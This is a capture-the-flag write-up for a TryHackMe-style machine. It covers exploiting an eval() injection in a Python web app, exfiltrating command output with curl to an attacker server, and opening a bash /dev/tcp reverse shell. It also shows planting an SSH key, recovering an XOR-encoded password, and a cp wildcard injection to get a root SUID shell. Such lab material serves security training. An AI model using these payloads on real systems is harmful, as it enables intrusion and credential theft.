# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 5000 | HTTP |




# RECONNAISSANCE
---

![Pasted image 20250504141045.png](../../IMAGES/Pasted%20image%2020250504141045.png)

As seen we got some math formulas we can use, also, we can get the source code, let's download it and perform some analysis on it:

```
ls -la
.rw-r--r-- 3.5k samsepiol 19 Feb 2023 app.py
.rw-r--r-- 219 samsepiol 12 May 2022 bisection.py
.rw-r--r-- 149 samsepiol 12 May 2022 prime.py
.rw-r--r-- 284 samsepiol 12 May 2022 quadratic.py
drwxr-xr-x - samsepiol 19 Feb 2023 templates
```

If we analyze the source code from `app.py`, we can notice this interesting thing on a function named `bisect()`:

```python
def bisect(xa,xb):
 added = xa + " + " + xb
 c = eval(added)
 c = int(c)/2
 ya = (int(xa)**6) - int(xa) - 1 #f(a)
 yb = (int(xb)**6) - int(xb) - 1 #f(b)
 
 if ya > 0 and yb > 0: #If they are both positive, since we are checking for one root between the points, not two. Then if both positive, no root
 root = 0
 return root
 else:
 e = 0.0001 #When to stop checking, number is really small

 l = 0 #Loop
 while l < 1: #Endless loop until condition is met
 d = int(xb) - c #Variable d to check for e
 if d <= e: #If d < e then we break the loop
 l = l + 1
 else:
 yc = (c**6) - c - 1 #f(c)
 if yc > 0: #If f(c) is positive then we switch the b variable with c and get the new c variable
 xb = c
 c = (int(xa) + int(xb))/2
 elif yc < 0: #If (c) is negative then we switch the a variable instead
 xa = c 
 c = (int(xa) + int(xb))/2
 c_format = "{0:.4f}"
 root = float(c_format.format(c))
 return root
```


As seen, this function uses `eval()`, this allows us to get `RCE`, The code constructs a string`added = xa + " + " + xb` and evaluates it via`c = eval(added)`. An attacker can craft malicious input for`xa` or`xb` to form a valid Python expression that executes arbitrary code.

We can now proceed to exploitation.


# EXPLOITATION
---

Let's try some basic `RCE` using this:

```python
__import__('os').system('id')
```

![Pasted image 20250504142444.png](../../IMAGES/Pasted%20image%2020250504142444.png)

![Pasted image 20250504142457.png](../../IMAGES/Pasted%20image%2020250504142457.png)

We get an internal server error, this happens due to the payload being evaluated by the server and then converting the non numerical string (`xa`) to an integer, this causes a `ValueError`, which throws us the `500` status code error.

So, how can we achieve the `RCE`? 

We can simply set up a python server and encode the contents of the command we are dealing with using `base64` so we can notice if the server actually executes the command, let's do the following command:

```python
__import__('os').system('curl http://10.11.136.34:8000?pwned=$(id|base64)')
```


![Pasted image 20250504142758.png](../../IMAGES/Pasted%20image%2020250504142758.png)

We get `500` status code again, but if we check our python server, this happens:

```python
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.170.179 - - [04/May/2025 19:23:30] "GET /?pwned=dWlkPTEwMDAoYnJ1Y2UpIGdpZD0xMDAwKGJydWNlKSBncm91cHM9MTAwMChicnVjZSkK HTTP/1.1" 200 -
```

If we decode the contents:

```python
Encrypted data: dWlkPTEwMDAoYnJ1Y2UpIGdpZD0xMDAwKGJydWNlKSBncm91cHM9MTAwMChicnVjZSkK
[+] Decrypted: uid=1000(bruce) gid=1000(bruce) groups=1000(bruce)
```

As seen `RCE` works. Let's craft a payload to get a reverse shell:

```python
__import__('os').system('bash -c "bash -i >& /dev/tcp/IP/9001 0>&1"')
```

If we got our listener ready, we will receive the connection:

![Pasted image 20250504143524.png](../../IMAGES/Pasted%20image%2020250504143524.png)

Let's begin privilege escalation.



# PRIVILEGE ESCALATION
---


First step is to get ourselves a stable shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250504143634.png](../../IMAGES/Pasted%20image%2020250504143634.png)

We can read first flag:

```
bruce@devie:~$ cat flag1.txt
THM{Car3ful_witH_3v@l}
```

In our home directory, we can find this:

```bash
bruce@devie:~$ ls -la
total 44
drwxr-xr-x 4 bruce bruce 4096 Feb 20 2023 .
drwxr-xr-x 4 root root 4096 May 12 2022 ..
lrwxrwxrwx 1 root root 9 May 13 2022 .bash_history -> /dev/null
-rw-r--r-- 1 bruce bruce 220 Feb 25 2020 .bash_logout
-rw-r--r-- 1 bruce bruce 3771 Feb 25 2020 .bashrc
drwx------ 2 bruce bruce 4096 May 12 2022 .cache
-rw-r--r-- 1 root root 158 Feb 19 2023 checklist
-rw-r----- 1 root bruce 23 May 12 2022 flag1.txt
-rw-r--r-- 1 root root 355 Feb 20 2023 note
-rw-r--r-- 1 bruce bruce 807 Feb 25 2020 .profile
-rw-rw-r-- 1 bruce bruce 75 May 12 2022 .selected_editor
drwx------ 2 bruce bruce 4096 May 12 2022 .ssh
-rw------- 1 bruce bruce 0 May 12 2022 .viminfo
```

We can add our `id_rsa` key to `authorized_keys` and migrate to `ssh`, let's do it:

```bash
echo 'OUR_ID_RSA.PUB KEY' >> /home/bruce/.ssh/authorized_keys
```

Now, let's go into ssh:

![Pasted image 20250504144058.png](../../IMAGES/Pasted%20image%2020250504144058.png)

Nice, let's proceed to analyze those interesting files we found `checklist` and `note`:

```bash
bruce@devie:~$ cat note
Hello Bruce,

I have encoded my password using the super secure XOR format.

I made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the decoding script for it soon. However, you can use my script located in the /opt/ directory.

For now look at this super secure string:
NEUEDTIeN1MRDg5K

Gordon
```

```bash
cat checklist
Web Application Checklist:
1. Built Site - check
2. Test Site - check
3. Move Site to production - check
4. Remove dangerous fuctions from site - check
Bruce


```

If we check our `sudo -l` privileges:

```bash
bruce@devie:~$ sudo -l
Matching Defaults entries for bruce on devie:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bruce may run the following commands on devie:
 (gordon) NOPASSWD: /usr/bin/python3 /opt/encrypt.py
```

We can run `/usr/bin/python3 /opt/encrypt.py` as gordon, let's check it out:

```
bruce@devie:~$ sudo -u gordon /usr/bin/python3 /opt/encrypt.py
Enter a password to encrypt: NEUEDTIeN1MRDg5K
PTAlIDYnLAY8VDk5IR5NJA==
```

We need to apply something called `plaintext attack` to figure out the `XOR` key, since the script should follow a flow like this:

```
Plaintext > XOR > Base64
```

We know we can be able to figure out the key, let's use this python script:

```python
import base64
import subprocess

def xor_bytes(a, b):
 return bytes([x ^ y for x, y in zip(a, b)])

# Step 1: Use a known plaintext (12 'A's to match the encrypted password length)
plaintext = "A" * 12
print(f"[*] Using plaintext: {plaintext}")

# Step 2: Encrypt the plaintext using the script
try:
 output = subprocess.check_output(
 f'echo "{plaintext}" | sudo -u gordon /usr/bin/python3 /opt/encrypt.py',
 shell=True,
 stderr=subprocess.STDOUT,
 text=True
 )
except subprocess.CalledProcessError as e:
 print(f"[-] Error: {e.output}")
 exit(1)

# Extract the base64 output (handle prompt text if present)
encrypted_b64 = output.strip().split()[-1] # Adjust based on actual output
print(f"[+] Encrypted output: {encrypted_b64}")

# Step 3: Decode the ciphertext
ciphertext = base64.b64decode(encrypted_b64)
plaintext_bytes = plaintext.encode()

# Step 4: Derive the XOR key
key = xor_bytes(plaintext_bytes, ciphertext)
print(f"[+] Derived key (hex): {key.hex()}")

# Step 5: Decrypt Gordon's encrypted password
gordon_encrypted_b64 = "NEUEDTIeN1MRDg5K"
gordon_encrypted = base64.b64decode(gordon_encrypted_b64)
password_bytes = xor_bytes(gordon_encrypted, key)

# Step 6: Decode to plaintext (ignore errors for non-UTF8 chars)
password = password_bytes.decode('utf-8', errors='ignore').strip()
print(f"\n[+] Gordon's password: {passw
```

The script first generates a **known plaintext**, and uses the encryption tool to encode it. Since XOR encryption has a critical weakness,applying the same key twice cancels the encryption, the script compares the plaintext with its encrypted version to derive the secret XOR key. With the key extracted, the script then decrypts Gordon's encoded password (`NEUEDTIeN1MRDg5K`) by reversing the XOR operation. Finally, it decodes the result from Base64 to reveal the original password. This approach bypasses the need to directly access the encryption script or key, leveraging the predictable behavior of XOR to expose the hidden credentials.


If we use the script, we get this:

```python
bruce@devie:~$ python3 exploit.py
[*] Using plaintext: AAAAAAAAAAAA
[+] Encrypted output: MjQxJDMyJCIzJDUq
[+] Derived key (hex): 73757065727365637265746b

[+] Gordon's password: G0th@mR0ckz!
```

We got `gordon` password, we can now switch to gordon, let's read `flag2`:

```
gordon@devie:~$ cat flag2.txt
THM{X0R_XoR_XOr_xOr}
```

We can see this on gordon's home:

```
gordon@devie:~$ ls -la
total 36
drwxr-xr-x 5 gordon gordon 4096 May 4 20:29 .
drwxr-xr-x 4 root root 4096 May 12 2022 ..
drwxrwx--- 2 gordon gordon 4096 Feb 19 2023 backups
lrwxrwxrwx 1 root root 9 May 13 2022 .bash_history -> /dev/null
-rw-r--r-- 1 gordon gordon 220 Feb 25 2020 .bash_logout
-rw-r--r-- 1 gordon gordon 3771 Feb 25 2020 .bashrc
drwx------ 2 gordon gordon 4096 May 4 20:29 .cache
-rw-r----- 1 root gordon 21 Aug 2 2022 flag2.txt
-rw-r--r-- 1 gordon gordon 807 Feb 25 2020 .profile
drwxrwx--- 2 gordon gordon 4096 Feb 19 2023 reports
-rw------- 1 gordon gordon 0 May 12 2022 .viminfo
```

If we look both directories:

```bash
gordon@devie:~$ ls -la backups/
total 20
drwxrwx--- 2 gordon gordon 4096 Feb 19 2023 .
drwxr-xr-x 5 gordon gordon 4096 May 4 20:29 ..
-rw-r--r-- 1 root root 57 May 4 20:32 report1
-rw-r--r-- 1 root root 72 May 4 20:32 report2
-rw-r--r-- 1 root root 100 May 4 20:32 report3

gordon@devie:~$ ls -la reports/
total 20
drwxrwx--- 2 gordon gordon 4096 Feb 19 2023 .
drwxr-xr-x 5 gordon gordon 4096 May 4 20:29 ..
-rw-r--r-- 1 640 gordon 57 Feb 19 2023 report1
-rw-r--r-- 1 640 gordon 72 Feb 19 2023 report2
-rw-r--r-- 1 640 gordon 100 Feb 19 2023 report3
```

It seems like there is some sort of backup going in the background by the root user that backups the contents of the `report` directory but, it changes the `ownership` to root, let's use `pspy` to check if its true:

![Pasted image 20250504153600.png](../../IMAGES/Pasted%20image%2020250504153600.png)

Nothing weird on here, maybe we are checking for a binary, let's use linpeas then:

![Pasted image 20250504153821.png](../../IMAGES/Pasted%20image%2020250504153821.png)

We got a `/usr/bin/backup`, let's check it out:

```
gordon@devie:~$ file /usr/bin/backup
/usr/bin/backup: Bourne-Again shell script, ASCII text executable

gordon@devie:~$ cat /usr/bin/backup
#!/bin/bash

cd /home/gordon/reports/

cp * /home/gordon/backups/
```

As seen, this uses `*` to copy the contents of the `reports` directory to the `backups` directory, this is vulnerable to `wildcard injection` due to the `*` character being `unquoted`, we can get a root shell by doing the following:

```
cd /home/gordon/reports/
touch -- '--preserve=mode'
cp /bin/bash .
chmod u+s bash
```

Once the /usr/bin/backup triggers, we can now see the bash binary inside of the backups directory:

```
gordon@devie:~/backups$ ls -la
total 1180
drwxrwx--- 2 gordon gordon 4096 May 4 21:06 .
drwxr-xr-x 6 gordon gordon 4096 May 4 20:36 ..
-rwsr-xr-x 1 root root 1183448 May 4 21:07 bash
-rwxrwxr-x 1 root root 25 May 4 21:07 exploit.sh
-rw-r--r-- 1 root root 57 May 4 21:07 report1
-rw-r--r-- 1 root root 72 May 4 21:07 report2
-rw-r--r-- 1 root root 100 May 4 21:07 report3
```

![Pasted image 20250504160803.png](../../IMAGES/Pasted%20image%2020250504160803.png)

There we go, let's read root flag and finish:

```
bash-5.0# cat /root/root.txt
THM{J0k3r$_Ar3_W1ld}
```

![Pasted image 20250504160833.png](../../IMAGES/Pasted%20image%2020250504160833.png)

